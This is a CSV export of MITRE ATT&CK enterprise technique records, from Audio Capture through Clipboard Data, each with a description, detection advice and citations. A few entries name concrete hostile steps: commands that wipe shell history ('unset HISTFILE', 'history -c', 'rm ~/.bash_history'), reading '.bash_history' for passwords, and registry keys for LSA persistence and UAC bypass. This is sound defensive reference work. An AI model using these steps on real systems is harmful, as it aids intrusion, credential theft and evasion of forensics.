Permissions Required: User","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'discovery'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1010', 'external_id': 'T1010'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['API monitoring', 'Process command-line parameters', 'Process monitoring']","['User']","['macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--1035cdf2-3e5f-446f-a7a7-e8f6d7925967","2017-05-31T21:31:34.528Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Audio Capture","An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.

Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.

Detection: Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.

Behavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the microphone, recording devices, or recording software, and a process periodically writing files to disk that contain audio data.

Platforms: Linux, macOS, Windows

Data Sources: API monitoring, Process monitoring, File monitoring

Permissions Required: User","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'collection'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1123', 'external_id': 'T1123'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['API monitoring', 'Process monitoring', 'File monitoring']","['User']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--52d40641-c480-4ad5-81a3-c80ccaddf82d","2017-05-31T21:31:43.135Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Authentication Package","Windows Authentication Package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system. (Citation: MSDN Authentication Packages)

Adversaries can use the autostart mechanism provided by LSA Authentication Packages for persistence by placing a reference to a binary in the Windows Registry location `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\` with the key value of `""Authentication Packages""=<target binary>`. The binary will then be executed by the system when the authentication packages are loaded.

Detection: Monitor the Registry for changes to the LSA Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned DLLs try to load into the LSA by setting the Registry key `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe` with AuditLevel = 8. (Citation: Graeber 2014) (Citation: Microsoft Configure LSA)

Platforms: Windows

Data Sources: DLL monitoring, Windows Registry, Loaded DLLs

Permissions Required: Administrator","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1131', 'external_id': 'T1131'}, {'source_name': 'MSDN Authentication Packages', 'description': 'Microsoft. (n.d.). Authentication Packages. Retrieved March 1, 2017.', 'url': 'https://msdn.microsoft.com/library/windows/desktop/aa374733.aspx'}, {'source_name': 'Graeber 2014', 'description': 'Graeber, M. (2014, October). Analysis of Malicious Security Support Provider DLLs. Retrieved March 1, 2017.', 'url': 'http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html'}, {'source_name': 'Microsoft Configure LSA', 'description': 'Microsoft. (2013, July 31). Configuring Additional LSA Protection. Retrieved June 24, 2015.', 'url': 'https://technet.microsoft.com/en-us/library/dn408187.aspx'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['DLL monitoring', 'Windows Registry', 'Loaded DLLs']","['Administrator']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--30208d3e-0d6b-43c8-883e-44462a514619","2017-05-31T21:31:27.985Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Automated Collection","Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of Scripting to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools. 

This technique may incorporate use of other techniques such as File and Directory Discovery and Remote File Copy to identify and move files.

Detection: Depending on the method used, actions could include common file system commands and parameters on the command-line interface within batch files or scripts. A sequence of actions like this may be unusual, depending on the system and network environment. Automated collection may occur along with other techniques such as Data Staged. As such, file access monitoring that shows an unusual process performing sequential file opens and potentially copy actions to another location on the file system for many files at once may indicate automated collection behavior. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: Linux, macOS, Windows

Data Sources: File monitoring, Process command-line parameters, Data loss prevention

Permissions Required: User

System Requirements: Permissions to access directories and files that store information of interest.","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'collection'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1119', 'external_id': 'T1119'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process command-line parameters', 'Data loss prevention']","['User']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","['Permissions to access directories and files that store information of interest.']","","",""
"attack-pattern","attack-pattern--774a3188-6ba9-4dc4-879d-d54ee48a5ce9","2017-05-31T21:30:29.458Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Automated Exfiltration","Data, such as sensitive documents, may be exfiltrated through the use of automated processing or Scripting after being gathered during Collection. 

When automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over Command and Control Channel and Exfiltration Over Alternative Protocol.

Detection: Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious.

Platforms: Linux, macOS, Windows

Data Sources: File monitoring, Process monitoring, Process use of network

Requires Network: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'exfiltration'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1020', 'external_id': 'T1020'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process monitoring', 'Process use of network']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","True",""
"attack-pattern","attack-pattern--44dca04b-808d-46ca-b25f-d85236d4b9f8","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Bash History","Bash keeps track of the commands users type on the command-line with the ""history"" utility. Once a user logs out, the history is flushed to the user’s `.bash_history` file. For each user, this file resides at the same location: `~/.bash_history`. Typically, this file keeps track of the user’s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Attackers can abuse this by looking through the file for potential credentials. (Citation: External to DA, the OS X Way)

Detection: Monitoring when the user's `.bash_history` is read can help alert to suspicious activity. While users do typically rely on their history of commands, they often access this history through other utilities like ""history"" instead of commands like `cat ~/.bash_history`.

Platforms: Linux, macOS

Data Sources: File monitoring, Process monitoring, Process command-line parameters

Permissions Required: User","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1139', 'external_id': 'T1139'}, {'source_name': 'External to DA, the OS X Way', 'description': 'Alex Rymdeko-Harvey, Steve Borosh. (2016, May 14). External to DA, the OS X Way. Retrieved July 3, 2017.', 'url': 'http://www.slideshare.net/StephanBorosh/external-to-da-the-os-x-way'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process monitoring', 'Process command-line parameters']","['User']","['Linux', 'macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--519630c5-f03f-4882-825c-3af924935817","2017-05-31T21:30:22.096Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Binary Padding","Some security tools inspect files with static signatures to determine if they are known malicious. Adversaries may add data to files to increase the size beyond what security tools are capable of handling or to change the file hash to avoid hash-based blacklists.

Detection: Depending on the method used to pad files, a file-based signature may be capable of detecting padding using a scanning or on-access based tool. 

When executed, the resulting process from padded files may also exhibit other behavior characteristics of being used to conduct an intrusion such as system and network information Discovery or Lateral Movement, which could be used as event indicators that point to the source file.

Platforms: Linux, macOS, Windows

Defense Bypassed: Anti-virus, Signature-based detection","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1009', 'external_id': 'T1009'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","","['Anti-virus', 'Signature-based detection']"
"attack-pattern","attack-pattern--02fefddc-fb1b-423f-a76b-7552dd211d4d","2017-05-31T21:30:54.661Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Bootkit","A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: MTrends 2016)

Adversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.

===Master Boot Record===
The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)

===Volume Boot Record===
The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.

Detection: Perform integrity checking on MBR and VBR. Take snapshots of MBR and VBR and compare against known good samples. Report changes to MBR and VBR as they occur for indicators of suspicious activity and further analysis.

Platforms: Linux, Windows

Data Sources: API monitoring, MBR, VBR

Permissions Required: Administrator, SYSTEM","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1067', 'external_id': 'T1067'}, {'source_name': 'Lau 2011', 'description': 'Lau, H. (2011, August 8). Are MBR Infections Back in Fashion? (Infographic). Retrieved November 13, 2014.', 'url': 'http://www.symantec.com/connect/blogs/are-mbr-infections-back-fashion'}, {'source_name': 'MTrends 2016', 'description': 'Mandiant. (2016, February). M-Trends 2016. Retrieved January 4, 2017.', 'url': 'https://www.fireeye.com/content/dam/fireeye-www/regional/fr%20FR/offers/pdfs/ig-mtrends-2016.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['API monitoring', 'MBR', 'VBR']","['Administrator', 'SYSTEM']","['Linux', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--389735f1-f21c-4208-b8f0-f8031e7169b8","2018-01-16T16:13:52.465Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Browser Extensions","Browser extensions or plugins are small programs that can add functionality and customize aspects of internet browsers. They can be installed directly or through a browser's app store. Extensions generally have access and permissions to everything that the browser can access. (Citation: Wikipedia Browser Extension) (Citation: Chrome Extensions Definition)

Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so may not be difficult for malicious extensions to defeat automated scanners and be uploaded. (Citation: Malicious Chrome Extension Numbers) Once the extension is installed, it can browse to websites in the background, (Citation: Chrome Extension Crypto Miner) steal all information that a user enters into a browser, to include credentials, (Citation: Banker Google Chrome Extension Steals Creds) (Citation: Catch All Chrome Extension) and be used as an installer for a RAT for persistence. There have been instances of botnets using a persistent backdoor through malicious Chrome extensions. (Citation: Stantinko Botnet) There have also been similar examples of extensions being used for command & control  (Citation: Chrome Extension C2 Malware).

Detection: Inventory and monitor browser extension installations that deviate from normal, expected, and benign extensions. Process and network monitoring can be used to detect browsers communicating with a C2 server. However, this may would prove to be a difficult way of initially detecting a malicious extension depending on the nature and volume of the traffic it generates.

Monitor for any new items written to the Registry or PE files written to disk. That may correlate with browser extension installation.

Platforms: Linux, macOS, Windows

Data Sources: Network protocol analysis, Packet capture, System calls, Process use of network, Process monitoring, Browser extensions

Permissions Required: User

Contributors: Justin Warner, ICEBRG","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'collection'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1176', 'external_id': 'T1176'}, {'source_name': 'Wikipedia Browser Extension', 'description': 'Wikipedia. (2017, October 8). Browser Extension. Retrieved January 11, 2018.', 'url': 'https://en.wikipedia.org/wiki/Browser%20extension'}, {'source_name': 'Chrome Extensions Definition', 'description': 'Chrome. (n.d.). What are Extensions?. Retrieved November 16, 2017.', 'url': 'https://developer.chrome.com/extensions'}, {'source_name': 'Malicious Chrome Extension Numbers', 'description': 'Jagpal, N., et al. (2015, August). Trends and Lessons from Three Years Fighting Malicious Extensions. Retrieved November 17, 2017.', 'url': 'https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/43824.pdf'}, {'source_name': 'Chrome Extension Crypto Miner', 'description': 'Brinkmann, M. (2017, September 19). First Chrome extension with JavaScript Crypto Miner detected. Retrieved November 16, 2017.', 'url': 'https://www.ghacks.net/2017/09/19/first-chrome-extension-with-javascript-crypto-miner-detected/'}, {'source_name': 'Banker Google Chrome Extension Steals Creds', 'description': 'Marinho, R. (n.d.). (Banker(GoogleChromeExtension)).targeting. Retrieved November 18, 2017.', 'url': 'https://isc.sans.edu/forums/diary/BankerGoogleChromeExtensiontargetingBrazil/22722/'}, {'source_name': 'Catch All Chrome Extension', 'description': 'Marinho, R. (n.d.). ""Catch-All"" Google Chrome Malicious Extension Steals All Posted Data. Retrieved November 16, 2017.', 'url': 'https://isc.sans.edu/forums/diary/CatchAll+Google+Chrome+Malicious+Extension+Steals+All+Posted+Data/22976/https:/threatpost.com/malicious-chrome-extension-steals-data-posted-to-any-website/128680/)'}, {'source_name': 'Stantinko Botnet', 'description': 'Vachon, F., Faou, M. (2017, July 20). Stantinko: A massive adware campaign operating covertly since 2012. Retrieved November 16, 2017.', 'url': 'https://www.welivesecurity.com/2017/07/20/stantinko-massive-adware-campaign-operating-covertly-since-2012/'}, {'source_name': 'Chrome Extension C2 Malware', 'description': 'Kjaer, M. (2016, July 18). Malware in the browser: how you might get hacked by a Chrome extension. Retrieved November 22, 2017.', 'url': 'https://kjaer.io/extension-malware/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Network protocol analysis', 'Packet capture', 'System calls', 'Process use of network', 'Process monitoring', 'Browser extensions']","['User']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Justin Warner, ICEBRG']","","","","",""
"attack-pattern","attack-pattern--a93494bb-4b80-4ea1-8695-3236a49916fd","2017-05-31T21:31:22.767Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Brute Force","Adversaries may use brute force techniques to attempt access to accounts when passwords are unknown or when password hashes are obtained.

Credential Dumping to obtain password hashes may only get an adversary so far when Pass the Hash is not an option. Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table. Cracking hashes is usually done on adversary-controlled systems outside of the target network. (Citation: Wikipedia Password cracking)

Adversaries may attempt to brute force logins without knowledge of passwords or hashes during an operation either with zero knowledge or by attempting a list of known or possible passwords. This is a riskier option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)

A related technique called password spraying uses one password, or a small list of passwords, that matches the complexity policy of the domain and may be a commonly used password. Logins are attempted with that password and many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)

Detection: It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network. 

Monitor authentication logs for system and application login failures of Valid Accounts. If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.

Also monitor for many failed authentication attempts across various accounts that may result from password spraying attempts.

Platforms: Linux, macOS, Windows

Data Sources: Authentication logs

Permissions Required: User

Contributors: John Strand","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1110', 'external_id': 'T1110'}, {'source_name': 'Wikipedia Password cracking', 'description': 'Wikipedia. (n.d.). Password cracking. Retrieved December 23, 2015.', 'url': 'https://en.wikipedia.org/wiki/Password%20cracking'}, {'source_name': 'Cylance Cleaver', 'description': 'Cylance. (2014, December). Operation Cleaver. Retrieved September 14, 2017.', 'url': 'https://www.cylance.com/content/dam/cylance/pages/operation-cleaver/Cylance%20Operation%20Cleaver%20Report.pdf'}, {'source_name': 'BlackHillsInfosec Password Spraying', 'description': 'Thyer, J. (2015, October 30). Password Spraying & Other Fun with RPCCLIENT. Retrieved April 25, 2017.', 'url': 'http://www.blackhillsinfosec.com/?p=4645'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Authentication logs']","['User']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['John Strand']","","","","",""
"attack-pattern","attack-pattern--ca1a3f50-5ebd-41f8-8320-2c7d6a6e88be","2017-05-31T21:31:07.462Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Bypass User Account Control","Windows User Account Control (UAC) allows a program to elevate its privileges to perform a task under administrator-level permissions by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. (Citation: TechNet How UAC Works)

If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs are allowed to elevate privileges or execute some elevated COM objects without prompting the user through the UAC notification box. (Citation: TechNet Inside UAC) (Citation: MSDN COM Elevation) An example of this is use of rundll32.exe to load a specifically crafted DLL which loads an auto-elevated COM object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user. (Citation: Davidson Windows) Adversaries can use these techniques to elevate privileges to administrator if the target process is unprotected.

Many methods have been discovered to bypass UAC. The Github readme page for UACMe contains an extensive list of methods (Citation: Github UACMe) that have been discovered and implemented within UACMe, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:

* `eventvwr.exe` can auto-elevate and execute a specified binary or script. (Citation: enigma0x3 Fileless UAC Bypass) (Citation: Fortinet Fareit)

Another bypass is possible through some Lateral Movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on lateral systems and default to high integrity. (Citation: SANS UAC Bypass)

Detection: There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of Process Injection and unusual loaded DLLs through DLL Search Order Hijacking, which indicate attempts to gain access to higher privileged processes.

Some UAC bypass methods rely on modifying specific, user-accessible Registry settings.  For example:

* The `eventvwr.exe` bypass uses the `[HKEY_CURRENT_USER]\Software\Classes\mscfile\shell\open\command` Registry key. (Citation: enigma0x3 Fileless UAC Bypass)
* The `sdclt.exe` bypass uses the `[HKEY_CURRENT_USER]\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe` and `[HKEY_CURRENT_USER]\Software\Classes\exefile\shell\runas\command\isolatedCommand` Registry keys. (Citation: enigma0x3 sdclt app paths) (Citation: enigma0x3 sdclt bypass)

Analysts should monitor these Registry settings for unauthorized changes.

Platforms: Windows

Data Sources: System calls, Process monitoring, Authentication logs, Process command-line parameters

Effective Permissions: Administrator

Defense Bypassed: Windows User Account Control

Permissions Required: User, Administrator

Contributors: Stefan Kanthak, Casey Smith","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1088', 'external_id': 'T1088'}, {'source_name': 'TechNet How UAC Works', 'description': 'Lich, B. (2016, May 31). How User Account Control Works. Retrieved June 3, 2016.', 'url': 'https://technet.microsoft.com/en-us/itpro/windows/keep-secure/how-user-account-control-works'}, {'source_name': 'TechNet Inside UAC', 'description': 'Russinovich, M. (2009, July). User Account Control: Inside Windows 7 User Account Control. Retrieved July 26, 2016.', 'url': 'https://technet.microsoft.com/en-US/magazine/2009.07.uac.aspx'}, {'source_name': 'MSDN COM Elevation', 'description': 'Microsoft. (n.d.). The COM Elevation Moniker. Retrieved July 26, 2016.', 'url': 'https://msdn.microsoft.com/en-us/library/ms679687.aspx'}, {'source_name': 'Davidson Windows', 'description': 'Davidson, L. (n.d.). Windows 7 UAC whitelist. Retrieved November 12, 2014.', 'url': 'http://www.pretentiousname.com/misc/win7%20uac%20whitelist2.html'}, {'source_name': 'Github UACMe', 'description': 'UACME Project. (2016, June 16). UACMe. Retrieved July 26, 2016.', 'url': 'https://github.com/hfiref0x/UACME'}, {'source_name': 'enigma0x3 Fileless UAC Bypass', 'description': 'Nelson, M. (2016, August 15). ""Fileless"" UAC Bypass using eventvwr.exe and Registry Hijacking. Retrieved December 27, 2016.', 'url': 'https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/'}, {'source_name': 'Fortinet Fareit', 'description': 'Salvio, J., Joven, R. (2016, December 16). Malicious Macro Bypasses UAC to Elevate Privilege for Fareit Malware. Retrieved December 27, 2016.', 'url': 'https://blog.fortinet.com/2016/12/16/malicious-macro-bypasses-uac-to-elevate-privilege-for-fareit-malware'}, {'source_name': 'SANS UAC Bypass', 'description': 'Medin, T. (2013, August 8). PsExec UAC Bypass. Retrieved June 3, 2016.', 'url': 'http://pen-testing.sans.org/blog/pen-testing/2013/08/08/psexec-uac-bypass'}, {'source_name': 'enigma0x3 sdclt app paths', 'description': 'Nelson, M. (2017, March 14). Bypassing UAC using App Paths. Retrieved May 25, 2017.', 'url': 'https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/'}, {'source_name': 'enigma0x3 sdclt bypass', 'description': 'Nelson, M. (2017, March 17). ""Fileless"" UAC Bypass Using sdclt.exe. Retrieved May 25, 2017.', 'url': 'https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['System calls', 'Process monitoring', 'Authentication logs', 'Process command-line parameters']","['User', 'Administrator']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Stefan Kanthak', 'Casey Smith']","['Administrator']","","","","['Windows User Account Control']"
"attack-pattern","attack-pattern--68c96494-1a50-403e-8844-69a6af278c68","2017-05-31T21:30:42.222Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Change Default File Association","When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access. (Citation: Microsoft Change Default Programs) (Citation: Microsoft File Handlers) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.

System file associations are listed under `HKEY_CLASSES_ROOT\.[extension]`, for example `HKEY_CLASSES_ROOT\.txt`. The entries point to a handler for that extension located at `HKEY_CLASSES_ROOT\[handler]`. The various commands are then listed as subkeys underneath the shell key at `HKEY_CLASSES_ROOT\[handler]\shell\[action]\command`. For example:
*`HKEY_CLASSES_ROOT\txtfile\shell\open\command`
*`HKEY_CLASSES_ROOT\txtfile\shell\print\command`
*`HKEY_CLASSES_ROOT\txtfile\shell\printto\command`

The values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to execute arbitrary commands.

Detection: Collect and analyze changes to Registry keys that associate file extensions to default applications for execution and correlate with unknown process launch activity or unusual file types for that process. 

User file association preferences are stored under ` [HKEY_CURRENT_USER]\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts` and override associations configured under `[HKEY_CLASSES_ROOT]`. Changes to a user's preference will occur under this entry's subkeys.

Also look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques.

Platforms: Windows

Data Sources: Windows Registry, Process command-line parameters, Process monitoring

Permissions Required: User, Administrator, SYSTEM

Contributors: Stefan Kanthak, Travis Smith, Tripwire","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1042', 'external_id': 'T1042'}, {'source_name': 'Microsoft Change Default Programs', 'description': 'Microsoft. (n.d.). Change which programs Windows 7 uses by default. Retrieved July 26, 2016.', 'url': 'https://support.microsoft.com/en-us/help/18539/windows-7-change-default-programs'}, {'source_name': 'Microsoft File Handlers', 'description': 'Microsoft. (n.d.). Specifying File Handlers for File Name Extensions. Retrieved November 13, 2014.', 'url': 'http://msdn.microsoft.com/en-us/library/bb166549.aspx'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Windows Registry', 'Process command-line parameters', 'Process monitoring']","['User', 'Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Stefan Kanthak', 'Travis Smith, Tripwire']","","","","",""
"attack-pattern","attack-pattern--d3046a90-580c-4004-8208-66915bc29830","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Clear Command History","macOS and Linux both keep track of the commands users type in their terminal so that users can easily remember what they've done. These logs can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable `HISTFILE`. When a user logs off a system, this information is flushed to a file in the user's home directory called `~/.bash_history`. The benefit of this is that it allows users to go back to commands they've used before in different sessions. Since everything typed on the command-line is saved, passwords passed in on the command line are also saved. Adversaries can abuse this by searching these files for cleartext passwords. Additionally, adversaries can use a variety of methods to prevent their own commands from appear in these logs such as `unset HISTFILE`, `export HISTFILESIZE=0`, `history -c`, `rm ~/.bash_history`.

Detection: User authentication, especially via remote terminal services like SSH, without new entries in that user's `~/.bash_history` is suspicious. Additionally, the modification of the HISTFILE and HISTFILESIZE environment variables or the removal/clearing of the `~/.bash_history` file are indicators of suspicious activity.

Platforms: Linux, macOS

Data Sources: Authentication logs, File monitoring

Defense Bypassed: Log analysis, Host forensic analysis

Permissions Required: User","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1146', 'external_id': 'T1146'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Authentication logs', 'File monitoring']","['User']","['Linux', 'macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","","['Log analysis', 'Host forensic analysis']"
"attack-pattern","attack-pattern--30973a08-aed9-4edf-8604-9084ce1b5c4f","2017-05-31T21:31:25.967Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Clipboard Data","Adversaries may collect data stored in the Windows clipboard from users copying information within or between applications. 

===Windows===

Applications can access clipboard data by using the Windows API. (Citation: MSDN Clipboard) 

===Mac===

OSX provides a native command, `pbpaste`, to grab clipboard contents  (Citation: Operating with EmPyre).

Detection: Access to the clipboard is a legitimate function of many applications on a Windows system. If an organization chooses to monitor for this behavior, then the data will likely need to be correlated against other suspicious or non-user-driven activity.

Platforms: Linux, macOS, Windows

Data Sources: API monitoring","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'collection'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1115', 'external_id': 'T1115'}, {'source_name': 'MSDN Clipboard', 'description': 'Microsoft. (n.d.). About the Clipboard. Retrieved March 29, 2016.', 'url': 'https://msdn.microsoft.com/en-us/library/ms649012'}, {'source_name': 'Operating with EmPyre', 'description': 'rvrsh3ll. (2016, May 18). Operating with EmPyre. Retrieved July 12, 2017.', 'url': 'http://www.rvrsh3ll.net/blog/empyre/operating-with-empyre/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['API monitoring']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
